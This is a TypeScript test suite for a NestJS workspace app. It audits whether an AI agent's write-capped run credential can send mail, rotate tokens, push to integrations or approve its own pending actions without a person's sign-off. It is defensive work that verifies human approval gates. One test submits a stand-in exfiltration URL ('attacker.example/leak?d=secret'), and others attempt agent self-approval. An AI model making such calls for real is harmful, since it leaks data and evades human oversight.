import 'reflect-metadata';
import http from 'node:http';
import https from 'node:https';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { randomUUID } from 'node:crypto';
import type { NestFastifyApplication } from '@nestjs/platform-fastify';
import { createTestApp } from './helpers/app';
import { connectTestDb } from './helpers/db';
import { ABSENT, fill, liveRoutes } from './helpers/route-sweep';
import type { AuditRoute } from './helpers/route-sweep';
import { buildRunCredentialWorld } from './helpers/run-credential-fixture';
import type { RunCredentialWorld } from './helpers/run-credential-fixture';
import { EXPLICIT, FANOUT_TICKET, mechanismOf } from './helpers/outward-audit';
import type { Mechanism } from './helpers/outward-audit';
import { connections } from '../src/db/schema';
import { seal } from '../src/common/secretbox';
import { EmailService } from '../src/mail/email.service';
import { ConnectionsService } from '../src/connections/connections.service';
import { SourcesService } from '../src/sources/sources.service';
import { WriteBackSubscriber } from '../src/sources/write-back.subscriber';
import { GithubReviewsService } from '../src/integrations/github-reviews.service';
import { GithubService } from '../src/integrations/github.service';
import { LinearService } from '../src/integrations/linear.service';
import { SlackService } from '../src/integrations/slack.service';
import { WebhooksService } from '../src/webhooks/webhooks.service';
import { CalendarSyncService } from '../src/calendar-sync/calendar-sync.service';
import { JobRunnerService } from '../src/automations/job-runner.service';

/**
 * #1135 — the outward-tool gate audit, ENFORCED (docs/architecture/runner-outward-tool-audit.md has the method and the table).
 *
 * The question: with a RUN CREDENTIAL (#1132: capped at `write`, source `agent`), can an agent do anything OUTWARD without a StoryOS
 * approval? ADR-0021 §7 said "anything outward still goes through StoryOS approvals" and left it unverified. This file is what keeps
 * the answer true after today:
 *
 *  1. every route of the LIVE route table, and every MCP tool in tools.ts, must be classified (derived from the route's own guards, or
 *     listed in helpers/outward-audit.ts). A new endpoint or tool nobody reviewed FAILS here;
 *  2. every route claimed UNREACHABLE is called with a REAL run credential (claimed over HTTP by a real Runner, not a forged row) and
 *     must be refused FOR THE REASON the classification names, while every outward sink is watched: the mail driver, every service's
 *     `fetcher`, node's http/https request, `fetch`, and the rows an outward effect would leave (approvals, jobs, deliveries, sources);
 *  3. the findings this audit fixed each get a CONTROL: the same call by a person does have the effect, so a refusal here cannot be a
 *     fixture that could not have seen it;
 *  4. what is GATED is shown staged, not performed.
 *
 * Mutation-checked: removing `@NoRunCredential()` from a route, or `allowRunButton: false` from the mint, fails 2 and 3 (see the PR).
 */
let app: NestFastifyApplication;
let w: RunCredentialWorld;
let routes: AuditRoute[] = [];
const { db, pool } = connectTestDb();

// ---- the outward sinks ----------------------------------------------------------------------------------------------------------
const sinks = { mail: [] as unknown[], calls: [] as string[], resend: [] as Array<{ to: string[]; subject: string }> };
const TABLES = ['approvals', 'automation_jobs', 'automation_runs', 'webhook_deliveries', 'webhook_subscriptions', 'sources', 'source_runs', 'connections', 'attachments', 'workspace_files', 'notifications', 'agent_write_gates'];
async function snapshot(): Promise<Record<string, number>> {
  const out: Record<string, number> = {};
  for (const t of TABLES) out[t] = Number((await pool.query(`select count(*)::int as n from ${t}`)).rows[0].n);
  out['api_tokens'] = Number((await pool.query('select count(*)::int as n from api_tokens')).rows[0].n);
  return out;
}
const sinkState = () => ({ mail: sinks.mail.length, calls: [...sinks.calls], resend: sinks.resend.length });

beforeAll(async () => {
  app = await createTestApp();
  routes = liveRoutes(app);
  const email = app.get(EmailService);
  email.driver = { name: 'audit-spy', send: async (m) => { sinks.mail.push(m); } };
  const record = (who: string) => async (...args: unknown[]) => {
    sinks.calls.push(`${who}: ${String(args[0])}`);
    return { status: 200, ok: true, json: async () => ({}), text: async () => '' };
  };
  const seams: Array<[string, unknown]> = [
    ['ConnectionsService', app.get(ConnectionsService)], ['SourcesService', app.get(SourcesService)], ['WriteBackSubscriber', app.get(WriteBackSubscriber)],
    ['GithubReviewsService', app.get(GithubReviewsService)], ['GithubService', app.get(GithubService)], ['LinearService', app.get(LinearService)],
    ['SlackService', app.get(SlackService)], ['WebhooksService', app.get(WebhooksService)], ['CalendarSyncService', app.get(CalendarSyncService)],
  ];
  for (const [name, svc] of seams) {
    expect(typeof (svc as { fetcher?: unknown }).fetcher, `${name} lost its fetcher seam: the audit can no longer watch it`).toBe('function');
    (svc as { fetcher: unknown }).fetcher = record(name);
  }
  // ConnectionsService is also the Resend sender of send_email: keep a body-reading recorder for it (the control needs the message).
  (app.get(ConnectionsService) as { fetcher: unknown }).fetcher = async (url: string, init: { body?: string }) => {
    sinks.calls.push(`ConnectionsService: ${url}`);
    if (url.endsWith('/emails')) { sinks.resend.push(JSON.parse(init.body ?? '{}')); return { status: 200, json: async () => ({ id: 'msg_1' }), text: async () => '' }; }
    return { status: 200, json: async () => ({ data: [] }), text: async () => '' };
  };
  for (const lib of [http, https]) vi.spyOn(lib, 'request').mockImplementation(((...a: unknown[]) => { sinks.calls.push(`${lib === http ? 'http' : 'https'}.request: ${String(a[0])}`); throw new Error('outbound request blocked by the outward audit'); }) as never);
  vi.spyOn(globalThis, 'fetch').mockImplementation((async (u: unknown) => { sinks.calls.push(`fetch: ${String(u)}`); throw new Error('outbound fetch blocked by the outward audit'); }) as never);
  w = await buildRunCredentialWorld(app, pool, 'OutwardAudit');
}, 180_000);

afterAll(async () => {
  vi.restoreAllMocks();
  await app.close();
  await pool.end();
});

const key = (r: { method: string; path: string }) => `${r.method} ${r.path}`;
const mech = (r: AuditRoute): Mechanism | null => mechanismOf({ guards: r.guards, sessionOnly: r.sessionOnly, noRunCredential: r.noRunCredential, runButton: r.runButton, requiredScope: r.requiredScope });

/** The sentence the refusal must carry, per mechanism: a refusal for a DIFFERENT reason (a 404, a 400) is not the claim. */
const REASON: Record<Mechanism, { status: number[]; text: RegExp }> = {
  scope_admin: { status: [403], text: /write-scoped; admin access is required/ },
  session_only: { status: [403], text: /needs a signed-in session/ },
  no_run_credential: { status: [403], text: /Runner run credential cannot do this/ },
  run_button_flag: { status: [403], text: /not allowed to run buttons/ },
  platform_admin_session: { status: [403], text: /signed-in session/ },
  runner_token_only: { status: [401, 403], text: /./ },
};

// ---- 1. classification ----------------------------------------------------------------------------------------------------------
describe('1. every live route and every MCP tool is classified', () => {
  it('sanity: the live route table is the real one', () => {
    expect(routes.length).toBeGreaterThan(300);
    expect(routes.filter((r) => r.noRunCredential).length, 'the @NoRunCredential routes are found').toBeGreaterThan(15);
  });

  it('no route is unclassified: it is derived-unreachable or has an explicit entry', () => {
    const open = routes.filter((r) => mech(r) === null && !EXPLICIT[key(r)]).map((r) => `${key(r)}   (${r.handler})`);
    expect(
      open,
      `\n${open.length} route(s) a run credential can reach have no verdict. Read what the route does and add it to EXPLICIT in test/helpers/outward-audit.ts ` +
        `(internal / gated / fanout), or mark it @NoRunCredential() if it leaves StoryOS and has no approval step. See docs/architecture/runner-outward-tool-audit.md.\n${open.join('\n')}\n`,
    ).toEqual([]);
  });

  it('no entry is dead or contradicts the route: it names a live route the guards do NOT already refuse', () => {
    const live = new Map(routes.map((r) => [key(r), r]));
    const dead = Object.keys(EXPLICIT).filter((k) => !live.has(k));
    expect(dead, 'EXPLICIT entries for routes that no longer exist').toEqual([]);
    const contradicted = Object.keys(EXPLICIT).filter((k) => live.has(k) && mech(live.get(k)!) !== null);
    expect(contradicted, 'EXPLICIT entries for routes a guard already refuses (delete the entry: the mechanism is the verdict)').toEqual([]);
  });

  it('every entry says why, an open finding names its ticket, and a claim of "internal" is not made for a route that mentions an outward word', () => {
    for (const [k, e] of Object.entries(EXPLICIT)) {
      expect(e.why.length, k).toBeGreaterThan(7);
      if (e.verdict === 'fanout') expect(e.why, k).toContain(FANOUT_TICKET);
    }
    const outwardWords = /\b(webhook|slack|email|mail|publish|share|invite|portal|credential|rotate|export)\b/i;
    const suspicious = Object.entries(EXPLICIT)
      .filter(([k, e]) => e.verdict === 'internal' && outwardWords.test(k) && !e.why.startsWith('reviewed:'))
      .map(([k]) => k);
    expect(suspicious, 'an "internal" route whose path says webhook/slack/email/publish/share/invite/portal/credential/rotate/export: read it again, and start its reason with "reviewed:" once you have').toEqual([]);
  });

  it('every MCP tool in tools.ts is classified, from the routes its source block calls', () => {
    const { tools, localTools } = mcpTools();
    expect(tools.size).toBeGreaterThan(190);
    const byNorm = routeIndex();
    const problems: string[] = [];
    for (const [name, called] of tools) {
      if (called.length === 0) {
        if (!localTools.has(name)) problems.push(`${name}: calls no REST route and is not in LOCAL_TOOLS (it goes through a helper): say what it does`);
        continue;
      }
      for (const c of called) if (!byNorm.has(c)) problems.push(`${name}: calls ${c}, which is not a live route`);
    }
    expect(problems, problems.join('\n')).toEqual([]);
    const dump = process.env.OUTWARD_AUDIT_DUMP;
    if (dump) {
      const verdict = (k: string) => { const r = byNorm.get(k)!; const m = mech(r); return m ? `unreachable:${m}` : EXPLICIT[key(r)]!.verdict; };
      writeFileSync(dump, JSON.stringify({
        routes: routes.map((r) => ({ key: key(r), handler: r.handler, verdict: mech(r) ? `unreachable:${mech(r)}` : EXPLICIT[key(r)]?.verdict, why: EXPLICIT[key(r)]?.why ?? null })),
        tools: [...tools].map(([name, called]) => ({ name, routes: called.map((c) => ({ key: c, verdict: verdict(c) })) })),
      }, null, 1));
    }
  });
});

// ---- 2. UNREACHABLE: refused for the reason named, nothing leaves --------------------------------------------------------------
describe('2. UNREACHABLE: a real run credential is refused, for the reason the classification names, and nothing outward happens', () => {
  // Handlers that validate a body before they refuse need a body that passes validation, or the 400 would hide the answer.
  const BODIES: Record<string, unknown> = {
    'POST /me/tokens': { name: 'x', workspace_id: ABSENT, scope: 'write' },
    'POST /oauth/consent': { consent_code: 'xxxxxxxxxx', decision: 'allow' },
    'POST /workspaces/:ws/runners/:id/activate': { tool: 'claude-code' },
    'PATCH /workspaces/:ws/runners/:id': { tool: 'claude-code' },
    'PUT /workspaces/:ws/runner-assignments/:agent': { runner_id: null },
  };

  it('every derived-unreachable route and every self-guarded handler refuses the credential, and the sinks stay silent', async () => {
    const targets = routes.filter((r) => mech(r) !== null || EXPLICIT[key(r)]?.verdict === 'self_guarded');
    expect(targets.length).toBeGreaterThan(200);
    const before = await snapshot();
    const sinkBefore = sinkState();
    const wrong: string[] = [];
    const seen = new Map<string, number>();
    for (const r of targets) {
      const m = mech(r);
      const url = `/api/v1${fill(w.ws, r.path, {})}`;
      const body = r.method === 'GET' ? undefined : BODIES[key(r)] ?? {};
      const res = await app.inject({ method: r.method as never, url, headers: { authorization: `Bearer ${w.credential}` }, payload: body as never });
      const expected = m ? REASON[m] : { status: [403], text: /./ };
      seen.set(m ?? 'self_guarded', (seen.get(m ?? 'self_guarded') ?? 0) + 1);
      if (!expected.status.includes(res.statusCode) || !expected.text.test(res.body)) {
        wrong.push(`${key(r)} [${m ?? 'self_guarded'}] -> ${res.statusCode} ${res.body.slice(0, 160)}`);
      }
    }
    expect(wrong, `routes claimed unreachable that did NOT refuse the run credential for the named reason:\n${wrong.join('\n')}`).toEqual([]);
    expect(await snapshot(), 'no row an outward effect would leave').toEqual(before);
    expect(sinkState(), 'no mail, no fetcher, no http(s).request, no fetch').toEqual(sinkBefore);
    // every mechanism was exercised: a mechanism with zero routes would be a claim nothing checked
    for (const m of ['scope_admin', 'session_only', 'no_run_credential', 'run_button_flag', 'platform_admin_session', 'runner_token_only', 'self_guarded']) {
      expect(seen.get(m) ?? 0, `mechanism ${m} exercised`).toBeGreaterThan(0);
    }
  }, 180_000);

  it('the credential is alive and write-capable (so the refusals above are not a dead token)', async () => {
    const ok = await w.as(w.credential, 'PATCH', `/workspaces/${w.ws}/databases/${w.ticketsDbId}/records/${w.ticketId}`, { values: { [w.notesApi]: 'agent was here' } });
    expect(ok.statusCode, ok.body).toBe(200);
    const row = (await pool.query("select origin, scope, runner_id, agent_id from api_tokens where runner_id is not null and revoked_at is null and wake_id = $1", [w.wakeId])).rows[0];
    expect(row).toMatchObject({ origin: 'agent', scope: 'write' });
    const commented = await w.as(w.credential, 'POST', `/workspaces/${w.ws}/databases/${w.ticketsDbId}/records/${w.ticketId}/comments`, { body: { format: 'blocknote', doc: [{ type: 'paragraph', content: [{ type: 'text', text: 'done', styles: {} }] }] } });
    expect(commented.statusCode, commented.body).toBe(201);
  });
});

// ---- 3. the findings this audit fixed, each with a control ---------------------------------------------------------------------
describe('3. FIXED findings: the same call by a person has the effect, by the run credential it is refused and nothing leaves', () => {
  async function resendConnection() {
    const adminRow = await pool.query('select id from "user" where email = $1', [w.admin.email]);
    const [conn] = await db
      .insert(connections)
      .values({ workspaceId: w.ws, provider: 'resend', name: `Resend ${randomUUID()}`, authSealed: seal(JSON.stringify({ api_key: 're_test', from_address: 'a@example.com' })), scopes: ['domain:example.com', 'from:a@example.com'], status: 'active', createdBy: adminRow.rows[0].id })
      .returning();
    return conn!.id;
  }

  it('F2 run_button: a button that sends an email is pressed by a person (the mail is sent) and refused to the run credential (it is not)', async () => {
    const dbRes = await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/databases`, { space_id: w.spaceId, name: `Buttons ${randomUUID()}` });
    const dbId = dbRes.json().id as string;
    const emailApi = (await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/databases/${dbId}/fields`, { display_name: 'Email', type: 'text', config: {} })).json().apiName as string;
    const conn = await resendConnection();
    const btn = await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/databases/${dbId}/fields`, {
      display_name: 'Notify', type: 'button',
      config: { color: 'green', actions: [{ type: 'send_email', connection_id: conn, to: '{Email}', subject: 'Hello', body_markdown: 'Body', require_approval: false }] },
    });
    expect(btn.statusCode, btn.body).toBe(201);
    const rec = (await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/databases/${dbId}/records`, { values: { name: 'Lead', [emailApi]: 'outsider@external.example' } })).json().id as string;
    const press = (token: string) => w.as(token, 'POST', `/workspaces/${w.ws}/databases/${dbId}/records/${rec}/buttons/${btn.json().id}/press`);

    const jobs = app.get(JobRunnerService);
    sinks.resend.length = 0;
    const refused = await press(w.credential);
    expect(refused.statusCode, refused.body).toBe(403);
    expect(refused.body).toContain('not allowed to run buttons');
    await jobs.tick();
    expect(sinks.resend, 'the run credential sent nothing').toHaveLength(0);

    const control = await press(w.admin.token);
    expect(control.statusCode, control.body).toBeLessThan(300);
    await jobs.tick();
    expect(sinks.resend, 'CONTROL: a person pressing the same button DOES send the mail, so the check above could have seen it').toHaveLength(1);
  });

  it('F3 regenerate-hook: a person rotates a webhook rule token and gets the new one; the run credential is refused and the token is unchanged', async () => {
    const dbId = w.ticketsDbId;
    const rule = await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/databases/${dbId}/automations`, {
      name: 'inbound', trigger: { type: 'webhook_received' }, actions: [{ type: 'create_record', database_id: dbId, values: { name: 'from hook' } }],
    });
    expect(rule.statusCode, rule.body).toBe(201);
    const url = `/workspaces/${w.ws}/databases/${dbId}/automations/${rule.json().id}/regenerate-hook`;
    const tokenOf = async () => (await pool.query('select hook_token from automations where id = $1', [rule.json().id])).rows[0].hook_token as string;
    const t0 = await tokenOf();
    const refused = await w.as(w.credential, 'POST', url);
    expect(refused.statusCode, refused.body).toBe(403);
    expect(refused.body).not.toContain('hookToken');
    expect(await tokenOf(), 'the token did not rotate').toBe(t0);
    const control = await w.as(w.admin.token, 'POST', url);
    expect(control.statusCode, control.body).toBeLessThan(300);
    expect(control.body, 'CONTROL: the response of a permitted call carries the new token, which is what the refusal withholds').toContain('hookToken');
    expect(await tokenOf()).not.toBe(t0);
  });

  it('F4 sources: write-back cannot be switched on by a run credential, and no source row appears', async () => {
    const before = await snapshot();
    const create = await w.as(w.credential, 'POST', `/workspaces/${w.ws}/databases/${w.ticketsDbId}/sources`, {
      name: 'push', connection_id: ABSENT, provider_source: 'shopify.products', config: { write_back: true, require_approval_for_push: false },
      field_mapping: {}, external_key_field_id: ABSENT,
    });
    expect(create.statusCode, create.body).toBe(403);
    expect(create.body).toContain('Runner run credential cannot do this');
    expect((await snapshot())['sources']).toBe(before['sources']);
    expect(sinkState().calls.filter((c) => /Sources|Shopify|WriteBack/.test(c))).toEqual([]);
  });

  it('F5 Tyron: a write-capped run credential cannot start a Tyron turn (which would mint a token from its owner\'s ROLE), approve its own pending action, or read the owner\'s threads', async () => {
    const before = (await snapshot())['api_tokens'];
    const base = `/workspaces/${w.ws}/tyron/threads`;
    for (const [m, p, b] of [['POST', base, { first_message: 'hi' }], ['GET', base, undefined], ['POST', `${base}/${ABSENT}/turns`, { message: 'delete everything' }], ['POST', `${base}/${ABSENT}/confirm`, { approve: true }], ['POST', `${base}/build`.replace('/build', `/${ABSENT}/build`), { description: 'a business' }]] as const) {
      const res = await w.as(w.credential, m, p, b);
      expect(res.statusCode, `${m} ${p}: ${res.body}`).toBe(403);
      expect(res.body).toContain('Runner run credential cannot do this');
    }
    expect((await snapshot())['api_tokens'], 'no token was minted on the credential\'s behalf').toBe(before);
    // CONTROL: the same route answers a person (an unknown thread is a 404, not a 403: the guard let them through).
    expect((await w.as(w.owner.token, 'POST', `${base}/${ABSENT}/confirm`, { approve: false })).statusCode).not.toBe(403);
  });

  it('F6 GitHub review writes, run reruns and attachment from-url are refused; their sinks stay silent', async () => {
    const sinkBefore = sinkState();
    const review = `/workspaces/${w.ws}/integrations/github/reviews/o/r/1`;
    const attempts: Array<[string, string, unknown]> = [
      ['POST', `${review}/reviews`, { event: 'APPROVE' }], ['POST', `${review}/comments`, { body: 'x', path: 'a', line: 1 }],
      ['POST', `${review}/comments/1/replies`, { body: 'x' }], ['POST', `${review}/comments/1/reactions`, { content: '+1' }],
      ['POST', `/workspaces/${w.ws}/runs/${ABSENT}/rerun`, {}], ['POST', `/workspaces/${w.ws}/runs/${ABSENT}/actions/0/rerun`, {}],
      ['POST', `/workspaces/${w.ws}/databases/${w.ticketsDbId}/records/${w.ticketId}/attachments/from-url`, { url: 'https://attacker.example/leak?d=secret' }],
    ];
    for (const [m, p, b] of attempts) {
      const res = await w.as(w.credential, m, p, b);
      expect(res.statusCode, `${m} ${p}: ${res.body}`).toBe(403);
      expect(res.body).toContain('Runner run credential cannot do this');
    }
    expect(sinkState()).toEqual(sinkBefore);
  });
});

// ---- 4. GATED: staged, not performed --------------------------------------------------------------------------------------------
describe('4. GATED: what a run credential can ask for is staged for a person, not performed', () => {
  it('a public skill asked for by the credential is created PERSONAL and a person-only approval is raised', async () => {
    const before = (await snapshot())['approvals'];
    const res = await w.as(w.credential, 'POST', `/workspaces/${w.ws}/skills`, { name: `Public skill ${randomUUID()}`, description: 'd', when_to_use: 'w', instructions: 'i', visibility: 'public' });
    expect(res.statusCode, res.body).toBeLessThan(300);
    const skill = res.json() as { visibility: string; public_token?: string | null; pending_approval_id?: string };
    expect(skill.visibility, 'never public until a person decides').not.toBe('public');
    expect(skill.public_token ?? null).toBeNull();
    expect((await snapshot())['approvals'], 'one approval was raised').toBe(before + 1);
    // ... and the credential cannot decide it (approve/reject are admin-scoped, and need a person).
    const pending = (await pool.query("select id from approvals where status = 'pending' order by created_at desc limit 1")).rows[0].id as string;
    for (const verb of ['approve', 'reject']) {
      expect((await w.as(w.credential, 'POST', `/workspaces/${w.ws}/approvals/${pending}/${verb}`, {})).statusCode).toBe(403);
    }
  });

  it('a gate the manager declared holds the credential\'s record write: 202 pending_approval, and nothing is written', async () => {
    const gate = await w.as(w.admin.token, 'POST', `/workspaces/${w.ws}/agent-write-gates`, { agent_id: w.agentId, operations: ['create', 'update'], database_id: w.ticketsDbId });
    expect(gate.statusCode, gate.body).toBe(201);
    const count = async () => Number((await pool.query('select count(*)::int as n from records where database_id = $1 and deleted_at is null', [w.ticketsDbId])).rows[0].n);
    const n0 = await count();
    const held = await w.as(w.credential, 'POST', `/workspaces/${w.ws}/databases/${w.ticketsDbId}/records`, { values: { name: 'Held by the gate' } });
    expect(held.statusCode, held.body).toBe(202);
    expect(held.json()).toMatchObject({ pending_approval: true });
    expect(await count(), 'nothing was written').toBe(n0);
    await w.as(w.admin.token, 'DELETE', `/workspaces/${w.ws}/agent-write-gates/${gate.json().id}`);
  });
});

// ---- helpers: the MCP side ------------------------------------------------------------------------------------------------------
/** Tools that call no REST route DIRECTLY: they go through resolve.ts / links.ts / automations.ts helpers. Each says what it does. */
const LOCAL_TOOLS = new Map<string, string>([
  ['get_started', 'static orientation text'],
  ['list_workspaces', 'GET /workspaces via resolve.ts'],
  ['list_databases', 'GET /workspaces/{ws}/databases via resolve.ts'],
  ['list_icon_set', 'static icon catalog'],
  ['reorder_fields', 'PATCH of a field position through links.ts/helpers: a schema write, admin scope (not advertised to write)'],
  ['reorder_views', 'PATCH of a view position through helpers: admin scope (not advertised to write)'],
  ['list_skills', 'GET /workspaces/{ws}/skills via resolve.ts'],
  ['get_automation', 'GET /workspaces/{ws}/databases/{db}/automations via automations.ts (admin scope)'],
]);

const REPO = join(import.meta.dirname, '..', '..', '..');
const norm = (p: string) => p.replace(/^\/api\/v1/, '').replace(/\{[^}]+\}|:[A-Za-z_]+/g, ':p');

function routeIndex(): Map<string, AuditRoute> {
  const m = new Map<string, AuditRoute>();
  for (const r of routes) m.set(`${r.method} ${norm(r.path)}`, r);
  return m;
}

/** Tool name -> the REST routes (`METHOD normalized-path`) its `reg(...)` block calls, read from the source so it cannot drift. */
function mcpTools(): { tools: Map<string, string[]>; localTools: Set<string> } {
  const src = readFileSync(join(REPO, 'packages', 'mcp', 'src', 'tools.ts'), 'utf8');
  const heads = [...src.matchAll(/\n {2}reg\(\s*\n\s*'([a-z_0-9]+)'/g)].map((m) => ({ at: m.index!, name: m[1]! }));
  const tools = new Map<string, string[]>();
  heads.forEach((h, i) => {
    const block = src.slice(h.at, heads[i + 1]?.at ?? src.length);
    const calls = [...new Set([...block.matchAll(/client\.(GET|POST|PATCH|PUT|DELETE)\(\s*'([^']+)'/g)].map((c) => `${c[1]} ${norm(c[2]!)}`))];
    tools.set(h.name, calls);
  });
  return { tools, localTools: new Set(LOCAL_TOOLS.keys()) };
}
